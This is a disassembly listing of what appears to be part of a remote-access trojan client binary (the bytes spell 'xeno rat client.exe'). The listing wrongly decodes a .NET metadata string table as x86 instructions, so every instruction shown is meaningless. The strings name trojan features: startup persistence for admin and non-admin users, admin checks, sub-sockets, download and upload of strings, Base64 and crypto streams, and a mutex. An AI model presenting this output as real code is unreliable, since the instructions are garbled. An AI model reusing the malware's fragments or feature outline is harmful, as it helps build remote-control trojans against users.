  409f7a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409f7e:	73 65                	jae    0x409fe5
  409f80:	6d                   	insl   (%dx),%es:(%edi)
  409f81:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409f85:	6f                   	outsl  %ds:(%esi),(%dx)
  409f86:	6d                   	insl   (%dx),%es:(%edi)
  409f87:	70 61                	jo     0x409fea
  409f89:	6e                   	outsb  %ds:(%esi),(%dx)
  409f8a:	79 41                	jns    0x409fcd
  409f8c:	74 74                	je     0x40a002
  409f8e:	72 69                	jb     0x409ff9
  409f90:	62 75 74             	bound  %esi,0x74(%ebp)
  409f93:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409f97:	6e                   	outsb  %ds:(%esi),(%dx)
  409f98:	74 69                	je     0x40a003
  409f9a:	6d                   	insl   (%dx),%es:(%edi)
  409f9b:	65 43                	gs inc %ebx
  409f9d:	6f                   	outsl  %ds:(%esi),(%dx)
  409f9e:	6d                   	insl   (%dx),%es:(%edi)
  409f9f:	70 61                	jo     0x40a002
  409fa1:	74 69                	je     0x40a00c
  409fa3:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  409fa6:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  409fad:	69 
  409fae:	62 75 74             	bound  %esi,0x74(%ebp)
  409fb1:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409fb5:	74 5f                	je     0x40a016
  409fb7:	55                   	push   %ebp
  409fb8:	73 65                	jae    0x40a01f
  409fba:	53                   	push   %ebx
  409fbb:	68 65 6c 6c 45       	push   $0x456c6c65
  409fc0:	78 65                	js     0x40a027
  409fc2:	63 75 74             	arpl   %esi,0x74(%ebp)
  409fc5:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  409fc9:	74 65                	je     0x40a030
  409fcb:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  409fcf:	65 74 65             	gs je  0x40a037
  409fd2:	56                   	push   %esi
  409fd3:	61                   	popa
  409fd4:	6c                   	insb   (%dx),%es:(%edi)
  409fd5:	75 65                	jne    0x40a03c
  409fd7:	00 47 65             	add    %al,0x65(%edi)
  409fda:	74 56                	je     0x40a032
  409fdc:	61                   	popa
  409fdd:	6c                   	insb   (%dx),%es:(%edi)
  409fde:	75 65                	jne    0x40a045
  409fe0:	00 53 65             	add    %dl,0x65(%ebx)
  409fe3:	74 56                	je     0x40a03b
  409fe5:	61                   	popa
  409fe6:	6c                   	insb   (%dx),%es:(%edi)
  409fe7:	75 65                	jne    0x40a04e
  409fe9:	00 47 65             	add    %al,0x65(%edi)
  409fec:	74 50                	je     0x40a03e
  409fee:	72 6f                	jb     0x40a05f
  409ff0:	70 65                	jo     0x40a057
  409ff2:	72 74                	jb     0x40a068
  409ff4:	79 56                	jns    0x40a04c
  409ff6:	61                   	popa
  409ff7:	6c                   	insb   (%dx),%es:(%edi)
  409ff8:	75 65                	jne    0x40a05f
  409ffa:	00 76 61             	add    %dh,0x61(%esi)
  409ffd:	6c                   	insb   (%dx),%es:(%edi)
  409ffe:	75 65                	jne    0x40a065
  40a000:	00 52 65             	add    %dl,0x65(%edx)
  40a003:	67 69 73 74 72 79 48 	imul   $0x69487972,0x74(%bp,%di),%esi
  40a00a:	69 
  40a00b:	76 65                	jbe    0x40a072
  40a00d:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  40a011:	65 30 52 65          	xor    %dl,%gs:0x65(%edx)
  40a015:	63 65 69             	arpl   %esp,0x69(%ebp)
  40a018:	76 65                	jbe    0x40a07f
  40a01a:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  40a01e:	65 31 52 65          	xor    %edx,%gs:0x65(%edx)
  40a022:	63 65 69             	arpl   %esp,0x69(%ebp)
  40a025:	76 65                	jbe    0x40a08c
  40a027:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  40a02b:	65 32 52 65          	xor    %gs:0x65(%edx),%dl
  40a02f:	63 65 69             	arpl   %esp,0x69(%ebp)
  40a032:	76 65                	jbe    0x40a099
  40a034:	00 61 64             	add    %ah,0x64(%ecx)
  40a037:	64 5f                	fs pop %edi
  40a039:	41                   	inc    %ecx
  40a03a:	73 73                	jae    0x40a0af
  40a03c:	65 6d                	gs insl (%dx),%es:(%edi)
  40a03e:	62 6c 79 52          	bound  %ebp,0x52(%ecx,%edi,2)
  40a042:	65 73 6f             	gs jae 0x40a0b4
  40a045:	6c                   	insb   (%dx),%es:(%edi)
  40a046:	76 65                	jbe    0x40a0ad
  40a048:	00 43 75             	add    %al,0x75(%ebx)
  40a04b:	72 72                	jb     0x40a0bf
  40a04d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a04f:	74 44                	je     0x40a095
  40a051:	6f                   	outsl  %ds:(%esi),(%dx)
  40a052:	6d                   	insl   (%dx),%es:(%edi)
  40a053:	61                   	popa
  40a054:	69 6e 5f 41 73 73 65 	imul   $0x65737341,0x5f(%esi),%ebp
  40a05b:	6d                   	insl   (%dx),%es:(%edi)
  40a05c:	62 6c 79 52          	bound  %ebp,0x52(%ecx,%edi,2)
  40a060:	65 73 6f             	gs jae 0x40a0d2
  40a063:	6c                   	insb   (%dx),%es:(%edi)
  40a064:	76 65                	jbe    0x40a0cb
  40a066:	00 52 65             	add    %dl,0x65(%edx)
  40a069:	6d                   	insl   (%dx),%es:(%edi)
  40a06a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a06b:	76 65                	jbe    0x40a0d2
  40a06d:	00 78 65             	add    %bh,0x65(%eax)
  40a070:	6e                   	outsb  %ds:(%esi),(%dx)
  40a071:	6f                   	outsl  %ds:(%esi),(%dx)
  40a072:	20 72 61             	and    %dh,0x61(%edx)
  40a075:	74 20                	je     0x40a097
  40a077:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40a07b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a07c:	74 2e                	je     0x40a0ac
  40a07e:	65 78 65             	gs js  0x40a0e6
  40a081:	00 63 62             	add    %ah,0x62(%ebx)
  40a084:	53                   	push   %ebx
  40a085:	69 7a 65 00 46 69 6e 	imul   $0x6e694600,0x65(%edx),%edi
  40a08c:	61                   	popa
  40a08d:	6c                   	insb   (%dx),%es:(%edi)
  40a08e:	55                   	push   %ebp
  40a08f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a090:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  40a093:	70 72                	jo     0x40a107
  40a095:	65 73 73             	gs jae 0x40a10b
  40a098:	65 64 53             	gs fs push %ebx
  40a09b:	69 7a 65 00 52 74 6c 	imul   $0x6c745200,0x65(%edx),%edi
  40a0a2:	47                   	inc    %edi
  40a0a3:	65 74 43             	gs je  0x40a0e9
  40a0a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0a7:	6d                   	insl   (%dx),%es:(%edi)
  40a0a8:	70 72                	jo     0x40a11c
  40a0aa:	65 73 73             	gs jae 0x40a120
  40a0ad:	69 6f 6e 57 6f 72 6b 	imul   $0x6b726f57,0x6e(%edi),%ebp
  40a0b4:	53                   	push   %ebx
  40a0b5:	70 61                	jo     0x40a118
  40a0b7:	63 65 53             	arpl   %esp,0x53(%ebp)
  40a0ba:	69 7a 65 00 4f 72 69 	imul   $0x69724f00,0x65(%edx),%edi
  40a0c1:	67 69 6e 61 6c 46 69 	imul   $0x6c69466c,0x61(%bp),%ebp
  40a0c8:	6c 
  40a0c9:	65 53                	gs push %ebx
  40a0cb:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40a0d2:	5f                   	pop    %edi
  40a0d3:	54                   	push   %esp
  40a0d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0d5:	74 61                	je     0x40a138
  40a0d7:	6c                   	insb   (%dx),%es:(%edi)
  40a0d8:	53                   	push   %ebx
  40a0d9:	69 7a 65 00 70 44 65 	imul   $0x65447000,0x65(%edx),%edi
  40a0e0:	73 74                	jae    0x40a156
  40a0e2:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  40a0e9:	53                   	push   %ebx
  40a0ea:	69 7a 65 00 70 4e 65 	imul   $0x654e7000,0x65(%edx),%edi
  40a0f1:	65 64 65 64 42       	gs fs gs fs inc %edx
  40a0f6:	75 66                	jne    0x40a15e
  40a0f8:	66 65 72 53          	data16 gs jb 0x40a14f
  40a0fc:	69 7a 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%edx),%edi
  40a103:	70 72                	jo     0x40a177
  40a105:	65 73 73             	gs jae 0x40a17b
  40a108:	65 64 42             	gs fs inc %edx
  40a10b:	75 66                	jne    0x40a173
  40a10d:	66 65 72 53          	data16 gs jb 0x40a164
  40a111:	69 7a 65 00 55 6e 63 	imul   $0x636e5500,0x65(%edx),%edi
  40a118:	6f                   	outsl  %ds:(%esi),(%dx)
  40a119:	6d                   	insl   (%dx),%es:(%edi)
  40a11a:	70 72                	jo     0x40a18e
  40a11c:	65 73 73             	gs jae 0x40a192
  40a11f:	65 64 42             	gs fs inc %edx
  40a122:	75 66                	jne    0x40a18a
  40a124:	66 65 72 53          	data16 gs jb 0x40a17b
  40a128:	69 7a 65 00 6f 72 69 	imul   $0x69726f00,0x65(%edx),%edi
  40a12f:	67 69 6e 61 6c 5f 73 	imul   $0x69735f6c,0x61(%bp),%ebp
  40a136:	69 
  40a137:	7a 65                	jp     0x40a19e
  40a139:	00 52 65             	add    %dl,0x65(%edx)
  40a13c:	73 69                	jae    0x40a1a7
  40a13e:	7a 65                	jp     0x40a1a5
  40a140:	00 53 69             	add    %dl,0x69(%ebx)
  40a143:	7a 65                	jp     0x40a1aa
  40a145:	4f                   	dec    %edi
  40a146:	66 00 49 6e          	data16 add %cl,0x6e(%ecx)
  40a14a:	64 65 78 4f          	fs gs js 0x40a19d
  40a14e:	66 00 53 79          	data16 add %dl,0x79(%ebx)
  40a152:	73 74                	jae    0x40a1c8
  40a154:	65 6d                	gs insl (%dx),%es:(%edi)
  40a156:	2e 54                	cs push %esp
  40a158:	68 72 65 61 64       	push   $0x64616572
  40a15d:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40a164:	5f                   	pop    %edi
  40a165:	45                   	inc    %ebp
  40a166:	6e                   	outsb  %ds:(%esi),(%dx)
  40a167:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40a16a:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40a171:	74 65                	je     0x40a1d8
  40a173:	6d                   	insl   (%dx),%es:(%edi)
  40a174:	2e 52                	cs push %edx
  40a176:	75 6e                	jne    0x40a1e6
  40a178:	74 69                	je     0x40a1e3
  40a17a:	6d                   	insl   (%dx),%es:(%edi)
  40a17b:	65 2e 56             	gs cs push %esi
  40a17e:	65 72 73             	gs jb  0x40a1f4
  40a181:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40a188:	46                   	inc    %esi
  40a189:	72 6f                	jb     0x40a1fa
  40a18b:	6d                   	insl   (%dx),%es:(%edi)
  40a18c:	42                   	inc    %edx
  40a18d:	61                   	popa
  40a18e:	73 65                	jae    0x40a1f5
  40a190:	36 34 53             	ss xor $0x53,%al
  40a193:	74 72                	je     0x40a207
  40a195:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40a19c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a19d:	6c                   	insb   (%dx),%es:(%edi)
  40a19e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a19f:	61                   	popa
  40a1a0:	64 53                	fs push %ebx
  40a1a2:	74 72                	je     0x40a216
  40a1a4:	69 6e 67 00 55 70 6c 	imul   $0x6c705500,0x67(%esi),%ebp
  40a1ab:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ac:	61                   	popa
  40a1ad:	64 53                	fs push %ebx
  40a1af:	74 72                	je     0x40a223
  40a1b1:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40a1b8:	74 72                	je     0x40a22c
  40a1ba:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  40a1c1:	53                   	push   %ebx
  40a1c2:	74 72                	je     0x40a236
  40a1c4:	69 6e 67 00 6d 75 74 	imul   $0x74756d00,0x67(%esi),%ebp
  40a1cb:	65 78 5f             	gs js  0x40a22d
  40a1ce:	73 74                	jae    0x40a244
  40a1d0:	72 69                	jb     0x40a23b
  40a1d2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1d3:	67 00 53 75          	add    %dl,0x75(%bp,%di)
  40a1d7:	62 73 74             	bound  %esi,0x74(%ebx)
  40a1da:	72 69                	jb     0x40a245
  40a1dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1dd:	67 00 50 72          	add    %dl,0x72(%bx,%si)
  40a1e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1e2:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a1e5:	73 4c                	jae    0x40a233
  40a1e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1e8:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  40a1ec:	6d                   	insl   (%dx),%es:(%edi)
  40a1ed:	70 75                	jo     0x40a264
  40a1ef:	74 65                	je     0x40a256
  40a1f1:	48                   	dec    %eax
  40a1f2:	61                   	popa
  40a1f3:	73 68                	jae    0x40a25d
  40a1f5:	00 73 74             	add    %dh,0x74(%ebx)
  40a1f8:	72 54                	jb     0x40a24e
  40a1fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1fb:	48                   	dec    %eax
  40a1fc:	61                   	popa
  40a1fd:	73 68                	jae    0x40a267
  40a1ff:	00 47 65             	add    %al,0x65(%edi)
  40a202:	74 48                	je     0x40a24c
  40a204:	61                   	popa
  40a205:	73 68                	jae    0x40a26f
  40a207:	00 65 78             	add    %ah,0x78(%ebp)
  40a20a:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  40a20e:	61                   	popa
  40a20f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  40a213:	61                   	popa
  40a214:	74 68                	je     0x40a27e
  40a216:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a219:	73 74                	jae    0x40a28f
  40a21b:	61                   	popa
  40a21c:	6c                   	insb   (%dx),%es:(%edi)
  40a21d:	6c                   	insb   (%dx),%es:(%edi)
  40a21e:	5f                   	pop    %edi
  40a21f:	70 61                	jo     0x40a282
  40a221:	74 68                	je     0x40a28b
  40a223:	00 63 6c             	add    %ah,0x6c(%ebx)
  40a226:	61                   	popa
  40a227:	73 73                	jae    0x40a29c
  40a229:	70 61                	jo     0x40a28c
  40a22b:	74 68                	je     0x40a295
  40a22d:	00 53 6f             	add    %dl,0x6f(%ebx)
  40a230:	75 72                	jne    0x40a2a4
  40a232:	63 65 42             	arpl   %esp,0x42(%ebp)
  40a235:	75 66                	jne    0x40a29d
  40a237:	66 65 72 4c          	data16 gs jb 0x40a287
  40a23b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a23d:	67 74 68             	addr16 je 0x40a2a8
  40a240:	00 44 65 73          	add    %al,0x73(%ebp,%eiz,2)
  40a244:	74 69                	je     0x40a2af
  40a246:	6e                   	outsb  %ds:(%esi),(%dx)
  40a247:	61                   	popa
  40a248:	74 69                	je     0x40a2b3
  40a24a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a24b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a24c:	42                   	inc    %edx
  40a24d:	75 66                	jne    0x40a2b5
  40a24f:	66 65 72 4c          	data16 gs jb 0x40a29f
  40a253:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a255:	67 74 68             	addr16 je 0x40a2c0
  40a258:	00 47 65             	add    %al,0x65(%edi)
  40a25b:	74 57                	je     0x40a2b4
  40a25d:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40a264:	78 74                	js     0x40a2da
  40a266:	4c                   	dec    %esp
  40a267:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a269:	67 74 68             	addr16 je 0x40a2d4
  40a26c:	00 70 6c             	add    %dh,0x6c(%eax)
  40a26f:	69 69 00 41 73 79 6e 	imul   $0x6e797341,0x0(%ecx),%ebp
  40a276:	63 43 61             	arpl   %eax,0x61(%ebx)
  40a279:	6c                   	insb   (%dx),%es:(%edi)
  40a27a:	6c                   	insb   (%dx),%es:(%edi)
  40a27b:	62 61 63             	bound  %esp,0x63(%ecx)
  40a27e:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a281:	72 65                	jb     0x40a2e8
  40a283:	61                   	popa
  40a284:	74 65                	je     0x40a2eb
  40a286:	53                   	push   %ebx
  40a287:	75 62                	jne    0x40a2eb
  40a289:	53                   	push   %ebx
  40a28a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a28b:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a28e:	46                   	inc    %esi
  40a28f:	6c                   	insb   (%dx),%es:(%edi)
  40a290:	75 73                	jne    0x40a305
  40a292:	68 46 69 6e 61       	push   $0x616e6946
  40a297:	6c                   	insb   (%dx),%es:(%edi)
  40a298:	42                   	inc    %edx
  40a299:	6c                   	insb   (%dx),%es:(%edi)
  40a29a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a29b:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a29e:	5f                   	pop    %edi
  40a29f:	73 6f                	jae    0x40a310
  40a2a1:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a2a4:	67 65 74 5f          	addr16 gs je 0x40a307
  40a2a8:	54                   	push   %esp
  40a2a9:	61                   	popa
  40a2aa:	73 6b                	jae    0x40a317
  40a2ac:	00 4d 61             	add    %cl,0x61(%ebp)
  40a2af:	72 73                	jb     0x40a324
  40a2b1:	68 61 6c 00 53       	push   $0x53006c61
  40a2b6:	79 73                	jns    0x40a32b
  40a2b8:	74 65                	je     0x40a31f
  40a2ba:	6d                   	insl   (%dx),%es:(%edi)
  40a2bb:	2e 53                	cs push %ebx
  40a2bd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40a2c1:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40a2c8:	6e 
  40a2c9:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40a2cc:	61                   	popa
  40a2cd:	6c                   	insb   (%dx),%es:(%edi)
  40a2ce:	00 53 79             	add    %dl,0x79(%ebx)
  40a2d1:	73 74                	jae    0x40a347
  40a2d3:	65 6d                	gs insl (%dx),%es:(%edi)
  40a2d5:	2e 43                	cs inc %ebx
  40a2d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d8:	6d                   	insl   (%dx),%es:(%edi)
  40a2d9:	70 6f                	jo     0x40a34a
  40a2db:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2dc:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a2de:	74 4d                	je     0x40a32d
  40a2e0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2e1:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40a2e4:	00 55 6e             	add    %dl,0x6e(%ebp)
  40a2e7:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  40a2ee:	00 6b 65             	add    %ch,0x65(%ebx)
  40a2f1:	72 6e                	jb     0x40a361
  40a2f3:	65 6c                	gs insb (%dx),%es:(%edi)
  40a2f5:	33 32                	xor    (%edx),%esi
  40a2f7:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a2fa:	6c                   	insb   (%dx),%es:(%edi)
  40a2fb:	00 73 68             	add    %dh,0x68(%ebx)
  40a2fe:	65 6c                	gs insb (%dx),%es:(%edi)
  40a300:	6c                   	insb   (%dx),%es:(%edi)
  40a301:	33 32                	xor    (%edx),%esi
  40a303:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a306:	6c                   	insb   (%dx),%es:(%edi)
  40a307:	00 55 73             	add    %dl,0x73(%ebp)
  40a30a:	65 72 33             	gs jb  0x40a340
  40a30d:	32 2e                	xor    (%esi),%ch
  40a30f:	64 6c                	fs insb (%dx),%es:(%edi)
  40a311:	6c                   	insb   (%dx),%es:(%edi)
  40a312:	00 75 73             	add    %dh,0x73(%ebp)
  40a315:	65 72 33             	gs jb  0x40a34b
  40a318:	32 2e                	xor    (%esi),%ch
  40a31a:	64 6c                	fs insb (%dx),%es:(%edi)
  40a31c:	6c                   	insb   (%dx),%es:(%edi)
  40a31d:	00 6e 74             	add    %ch,0x74(%esi)
  40a320:	64 6c                	fs insb (%dx),%es:(%edi)
  40a322:	6c                   	insb   (%dx),%es:(%edi)
  40a323:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a326:	6c                   	insb   (%dx),%es:(%edi)
  40a327:	00 6d 73             	add    %ch,0x73(%ebp)
  40a32a:	76 63                	jbe    0x40a38f
  40a32c:	72 74                	jb     0x40a3a2
  40a32e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a331:	6c                   	insb   (%dx),%es:(%edi)
  40a332:	00 4b 69             	add    %cl,0x69(%ebx)
  40a335:	6c                   	insb   (%dx),%es:(%edi)
  40a336:	6c                   	insb   (%dx),%es:(%edi)
  40a337:	00 43 72             	add    %al,0x72(%ebx)
  40a33a:	79 70                	jns    0x40a3ac
  40a33c:	74 6f                	je     0x40a3ad
  40a33e:	53                   	push   %ebx
  40a33f:	74 72                	je     0x40a3b3
  40a341:	65 61                	gs popa
  40a343:	6d                   	insl   (%dx),%es:(%edi)
  40a344:	00 4d 65             	add    %cl,0x65(%ebp)
  40a347:	6d                   	insl   (%dx),%es:(%edi)
  40a348:	6f                   	outsl  %ds:(%esi),(%dx)
  40a349:	72 79                	jb     0x40a3c4
  40a34b:	53                   	push   %ebx
  40a34c:	74 72                	je     0x40a3c0
  40a34e:	65 61                	gs popa
  40a350:	6d                   	insl   (%dx),%es:(%edi)
  40a351:	00 50 72             	add    %dl,0x72(%eax)
  40a354:	6f                   	outsl  %ds:(%esi),(%dx)
  40a355:	67 72 61             	addr16 jb 0x40a3b9
  40a358:	6d                   	insl   (%dx),%es:(%edi)
  40a359:	00 68 4d             	add    %ch,0x4d(%eax)
  40a35c:	65 6d                	gs insl (%dx),%es:(%edi)
  40a35e:	00 67 65             	add    %ah,0x65(%edi)
  40a361:	74 5f                	je     0x40a3c2
  40a363:	49                   	dec    %ecx
  40a364:	74 65                	je     0x40a3cb
  40a366:	6d                   	insl   (%dx),%es:(%edi)
  40a367:	00 73 65             	add    %dh,0x65(%ebx)
  40a36a:	74 5f                	je     0x40a3cb
  40a36c:	49                   	dec    %ecx
  40a36d:	74 65                	je     0x40a3d4
  40a36f:	6d                   	insl   (%dx),%es:(%edi)
  40a370:	00 4f 70             	add    %cl,0x70(%edi)
  40a373:	65 72 61             	gs jb  0x40a3d7
  40a376:	74 69                	je     0x40a3e1
  40a378:	6e                   	outsb  %ds:(%esi),(%dx)
  40a379:	67 53                	addr16 push %ebx
  40a37b:	79 73                	jns    0x40a3f0
  40a37d:	74 65                	je     0x40a3e4
  40a37f:	6d                   	insl   (%dx),%es:(%edi)
  40a380:	00 53 79             	add    %dl,0x79(%ebx)
  40a383:	6d                   	insl   (%dx),%es:(%edi)
  40a384:	6d                   	insl   (%dx),%es:(%edi)
  40a385:	65 74 72             	gs je  0x40a3fa
  40a388:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40a38f:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40a396:	73 
  40a397:	68 41 6c 67 6f       	push   $0x6f676c41
  40a39c:	72 69                	jb     0x40a407
  40a39e:	74 68                	je     0x40a408
  40a3a0:	6d                   	insl   (%dx),%es:(%edi)
  40a3a1:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40a3a5:	6d                   	insl   (%dx),%es:(%edi)
  40a3a6:	00 49 43             	add    %cl,0x43(%ecx)
  40a3a9:	72 79                	jb     0x40a424
  40a3ab:	70 74                	jo     0x40a421
  40a3ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3ae:	54                   	push   %esp
  40a3af:	72 61                	jb     0x40a412
  40a3b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3b2:	73 66                	jae    0x40a41a
  40a3b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3b5:	72 6d                	jb     0x40a424
  40a3b7:	00 42 6f             	add    %al,0x6f(%edx)
  40a3ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3bb:	6c                   	insb   (%dx),%es:(%edi)
  40a3bc:	65 61                	gs popa
  40a3be:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3bf:	00 49 73             	add    %cl,0x73(%ecx)
  40a3c2:	4c                   	dec    %esp
  40a3c3:	69 74 74 6c 65 45 6e 	imul   $0x646e4565,0x6c(%esp,%esi,2),%esi
  40a3ca:	64 
  40a3cb:	69 61 6e 00 54 69 6d 	imul   $0x6d695400,0x6e(%ecx),%esp
  40a3d2:	65 53                	gs push %ebx
  40a3d4:	70 61                	jo     0x40a437
  40a3d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3d7:	00 5f 4d             	add    %bl,0x4d(%edi)
  40a3da:	61                   	popa
  40a3db:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  40a3e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3e3:	6d                   	insl   (%dx),%es:(%edi)
  40a3e4:	61                   	popa
  40a3e5:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40a3ec:	43                   	inc    %ebx
  40a3ed:	75 72                	jne    0x40a461
  40a3ef:	72 65                	jb     0x40a456
  40a3f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3f2:	74 44                	je     0x40a438
  40a3f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3f5:	6d                   	insl   (%dx),%es:(%edi)
  40a3f6:	61                   	popa
  40a3f7:	69 6e 00 49 73 55 73 	imul   $0x73557349,0x0(%esi),%ebp
  40a3fe:	65 72 41             	gs jb  0x40a442
  40a401:	6e                   	outsb  %ds:(%esi),(%dx)
  40a402:	41                   	inc    %ecx
  40a403:	64 6d                	fs insl (%dx),%es:(%edi)
  40a405:	69 6e 00 41 64 64 54 	imul   $0x54646441,0x0(%esi),%ebp
  40a40c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a40d:	53                   	push   %ebx
  40a40e:	74 61                	je     0x40a471
  40a410:	72 74                	jb     0x40a486
  40a412:	75 70                	jne    0x40a484
  40a414:	4e                   	dec    %esi
  40a415:	6f                   	outsl  %ds:(%esi),(%dx)
  40a416:	6e                   	outsb  %ds:(%esi),(%dx)
  40a417:	41                   	inc    %ecx
  40a418:	64 6d                	fs insl (%dx),%es:(%edi)
  40a41a:	69 6e 00 41 64 64 54 	imul   $0x54646441,0x0(%esi),%ebp
  40a421:	6f                   	outsl  %ds:(%esi),(%dx)
  40a422:	53                   	push   %ebx
  40a423:	74 61                	je     0x40a486
  40a425:	72 74                	jb     0x40a49b
  40a427:	75 70                	jne    0x40a499
  40a429:	41                   	inc    %ecx
  40a42a:	64 6d                	fs insl (%dx),%es:(%edi)
  40a42c:	69 6e 00 49 73 41 64 	imul   $0x64417349,0x0(%esi),%ebp
  40a433:	6d                   	insl   (%dx),%es:(%edi)
  40a434:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40a43b:	00 67 65             	add    %ah,0x65(%edi)
  40a43e:	74 5f                	je     0x40a49f
  40a440:	4f                   	dec    %edi
  40a441:	53                   	push   %ebx
  40a442:	56                   	push   %esi
  40a443:	65 72 73             	gs jb  0x40a4b9
  40a446:	69 6f 6e 00 47 65 74 	imul   $0x74654700,0x6e(%edi),%ebp
  40a44d:	57                   	push   %edi
  40a44e:	69 6e 64 6f 77 73 56 	imul   $0x5673776f,0x64(%esi),%ebp
  40a455:	65 72 73             	gs jb  0x40a4cb
  40a458:	69 6f 6e 00 43 6f 6d 	imul   $0x6d6f4300,0x6e(%edi),%ebp
  40a45f:	70 72                	jo     0x40a4d3
  40a461:	65 73 73             	gs jae 0x40a4d7
  40a464:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40a46b:	5f                   	pop    %edi
  40a46c:	4c                   	dec    %esp
  40a46d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a46e:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a471:	69 6f 6e 00 41 63 74 	imul   $0x74634100,0x6e(%edi),%ebp
  40a478:	69 6f 6e 00 6f 70 5f 	imul   $0x5f706f00,0x6e(%edi),%ebp
  40a47f:	53                   	push   %ebx
  40a480:	75 62                	jne    0x40a4e4
  40a482:	74 72                	je     0x40a4f6
  40a484:	61                   	popa
  40a485:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  40a489:	6e                   	outsb  %ds:(%esi),(%dx)
  40a48a:	00 53 79             	add    %dl,0x79(%ebx)
  40a48d:	73 74                	jae    0x40a503
  40a48f:	65 6d                	gs insl (%dx),%es:(%edi)
  40a491:	2e 52                	cs push %edx
  40a493:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40a496:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a49b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a49c:	00 4d 61             	add    %cl,0x61(%ebp)
  40a49f:	6e                   	outsb  %ds:(%esi),(%dx)
